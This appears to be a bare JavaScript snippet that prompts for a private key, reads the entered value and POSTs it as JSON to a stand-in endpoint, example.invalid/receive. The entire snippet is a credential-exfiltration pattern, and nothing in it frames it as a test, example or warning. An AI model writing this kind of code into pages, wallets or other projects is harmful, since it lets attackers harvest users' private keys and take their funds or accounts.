const label = "Enter your private key";
const secret = input.value;
fetch("https://example.invalid/receive", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({privateKey: secret})});
